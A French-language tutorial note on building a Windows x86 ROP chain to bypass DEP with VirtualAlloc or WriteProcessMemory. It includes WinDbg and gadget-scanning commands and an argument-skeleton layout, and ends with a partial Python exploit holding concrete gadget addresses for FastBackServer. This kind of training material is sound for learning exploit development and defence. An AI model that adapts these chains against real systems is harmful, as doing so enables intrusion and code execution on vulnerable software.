# Déroulé de la construction d'une ROP chain

Procédure basique pour une ROP chain avec soit VirtualAlloc() soit WriteProcessMemory().     
Pour débugger la ROP chain : breakpoint sur le premier gadget puis touche 't' à l'infini sur WinDbg (en faisant du step over sur les grosses fonctions WinAPI bien sûr)

```
!vprot esp
# => Protect: 00000004 PAGE_READWRITE

.load narly
!nmod
# => Vérifier le DEP  
```

```
C:\Tools\RP> rp-win-x86.exe -f FastBackServer.exe -r 10 > rop.txt
```

Le ROP exige deux choses : 
1. le contrôle d'EIP/RIP
2. une zone mémoire que l'on contrôle et sur laquelle ESP peut pointer. (=> la chaîne ROP elle-même)

Gadget = Suite d'octets exécutable finissant par un transfert contrôlé (`ret`, `jmp reg`, `call reg`). Ils s'enchaînent par la pile : chaque `ret` saute au suivant (ESP = pointeur d'instruction de la chaîne).

On va chercher du "pop eax ; ret" (ou autre registre), parce que ce sont des gadgets assez forts permettant d'écrire dans les registres comme un mais depuis la pile. C'est souvent plus facile d'utiliser EAX et ECX que d'autres registres comme ESI à cause du nombre de gadgets disponibles. Et on va aussi chercher tout ce qui est "mov REG1, REG2" pour les transferts. Voir le fichier dédié pour les gadgets.

Si il y a un "pop" en trop, bien penser à ajouter du padding, et inversement.     
Exemple : 

```
payload += pop_eax_ebx       # Adresse de "pop eax ; pop ebx ; ret"
payload += p32(0xCAFE)       # -> EAX   (ce que l'on veut)
payload += p32(0x42424242)   # -> EBX   (PADDING)
payload += gadget_suivant    # C'est cette adresse que le ret popera
```

Chercher un module sans null byte si jamais ça passe par une fonction chiante.     
Si besoin, le copier en local et le repasser au scanner pour les gadgets : 

```
copy "C:\Program Files\Autre\Module\Ma_DLL.dll .
rp-win-x86.exe -f MaDLL.dll -r 5 > rop2.txt
```
## Fonctions 

On choisit ensuite la fonction que l'on va utiliser, c'est là que se fait le gros choix. 

Rendre exécutable l'existant -> VirtualProtect (+ NtProtectVirtualMemory)     
Allouer de l'exécutable -> VirtualAlloc (+ NtAllocateVirtualMemory)     
Écrire dans de l'exécutable -> WriteProcessMemory  (+ NtWriteVirtualMemory)     
Éteindre le DEP (x86) -> SetProcessDEPPolicy (+ NtSetInformationProcess)      
Exécution pure -> WinExec / CreateProcess / system / LoadLibrary     
...

Prototypes des deux principales (VirtualAlloc() + WriteProcessMemory()) :

```
LPVOID WINAPI VirtualAlloc(
_In_opt_ LPVOID lpAddress,
_In_ SIZE_T dwSize,
_In_ DWORD flAllocationType,
_In_ DWORD flProtect
);
```

```
BOOL WriteProcessMemory(
  HANDLE  hProcess,                
  LPVOID  lpBaseAddress,           
  LPCVOID lpBuffer,                
  SIZE_T  nSize,                   
  SIZE_T  *lpNumberOfBytesWritten  
);
```


On doit remplir les arguments et le retour. 

- VirtualAlloc (on rend la zone du shellcode exécutable) : 

```
0x45454545  # @ VirtualAlloc <- On "tombe" dessus -> VirtualAlloc s'exécute
0x46464646  # @ retour = SHELLCODE <- là où VirtualAlloc revient APRÈS
0x47474747  # lpAddress  (Argument 1)
0x48484848  # dwSize     (Argument 2)
0x49494949  # flAllocationType (Argument 3) -> 0x1000
0x51515151  # flProtect  (Argument 4) -> 0x40 (RWX)
```

- WriteProcessMemory (le shellcode est copié ailleurs) :

```
0x45454545  # @ WriteProcessMemory <- On "tombe" dessus -> WPM s'exécute
0x46464646  # @ retour = ENDROIT_STOCKAGE <- là où WPM revient APRÈS
0x47474747  # hProcess (Argument 1) -> 0xFFFFFFFF (processus courant)
0x48484848  # lpBaseAddress (Argument 2) -> Destination de la copie
0x49494949  # lpBuffer (Argument 3) -> @ du shellcode sur la stack (calculée depuis ESP)
0x4A4A4A4A  # nSize (Argument 4) -> taille du shellcode
0x51515151  # lpNumberOfBytesWritten (Argument 5) -> zone RW (.data)
```

## Récupération des informations

Exemple avec VirtualAlloc().   

On peut récupérer l'adresse de la fonction par l'IAT et en vérifiant qui l'importe avec IDA par exemple. Ou avec un petit 'u' en prenant la première ligne qui sort : 
- u Kernel32!VirtualAllocStub
- u Kernel32!WriteProcessMemoryStub
- ...

Les deux derniers arguments sont des énumérations. Le paramètre "flAllocationType" doit être mis à la valeur "MEM_COMMIT" (0x00001000) et le paramètre "flProtect" doit être mis à la valeur "PAGE_EXECUTE_READWRITE" (0x00000040). 
En utilisant bien le paramètre "flProtect", on peut aussi utiliser cette fonction comme un VirtualProtect() en mieux. Les deux autres sont simplement la taille et l'adresse, donc à déterminer selon les cas.

## Placement des arguments et exécution

L'adresse de la fonction se récupère en général par déréférencement de l'IAT, et l'adresse de la pile (du skeleton) se passe généralement par un offset. Il faudra souvent convertir si il y a des null bytes.

Exemple : si on a un WriteProcessMemory() à un offset arrière de 0x1C (soit 0x0000001C), il faudra prendre le problème à l'envers en ajoutant le négatif -0x1C (soit 0xFFFFFFE4) sur la stack puis utiliser un gadget.

Également, si on a un mauvais caractère, on pourra juste ajouter +1 et faire un "dec" après pour se débloquer.

Comme on est en `__stdcall` et avec 5 arguments, le layout devra être comme suit (exemple avec un WPM) : 

```
[ &WriteProcessMemory   ]   <- La chaine ROP fait un "ret" ici => EIP = WPM
[ adresse de retour     ]   <- [esp+0] Où WPM revient apres le ret 0x14
[ hProcess              ]   <- [esp+4]  Argument 1
[ lpBaseAddress         ]   <- [esp+8]  Argument 2
[ lpBuffer              ]   <- [esp+0C] Argument 3
[ nSize                 ]   <- [esp+10] Argument 4 
[ lpNumberOfBytesWritten]   <- [esp+14] Argument 5
```

Au final l'exploit doit donner quelque chose comme : 

```
va  = pack("<L", (0x45454545)) # dummy VirutalAlloc Address
va += pack("<L", (0x46464646)) # Shellcode Return Address
va += pack("<L", (0x47474747)) # dummy Shellcode Address
va += pack("<L", (0x48484848)) # dummy dwSize 
va += pack("<L", (0x49494949)) # dummy flAllocationType 
va += pack("<L", (0x51515151)) # dummy flProtect 

offset = b"A" * (276 - len(va))
eip = pack("<L", (0x50501110)) # push esp ; push eax ; pop edi; pop esi ; ret

rop = pack("<L", (0x5050118e)) # mov eax,esi ; pop esi ; retn
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffe4)) # -0x1C
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x50537d5b)) # push eax ; pop esi ; ret
rop += pack("<L", (0x5053a0f5)) # pop eax ; ret
rop += pack("<L", (0x5054A221)) # VirtualAlloc IAT + 1
rop += pack("<L", (0x505115a3)) # pop ecx ; ret
rop += pack("<L", (0xffffffff)) # -1 into ecx
rop += pack("<L", (0x5051579a)) # add eax, ecx ; ret
rop += pack("<L", (0x5051f278)) # mov eax, dword [eax] ; ret
rop += pack("<L", (0x5051cbb6)) # mov dword [esi], eax ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x50522fa7)) # inc esi ; add al, 0x2B ; ret
rop += pack("<L", (0x5050118e)) # mov eax, esi ; pop esi ; ret
rop += pack("<L", (0x42424242)) # junk
rop += pack("<L", (0x5052f773)) # push eax ; pop esi ; ret
[...]

padding = b"C" * 0xe0

shellcode = b"\xcc" * (0x400 - 276 - 4 - len(rop) - len(padding))
```

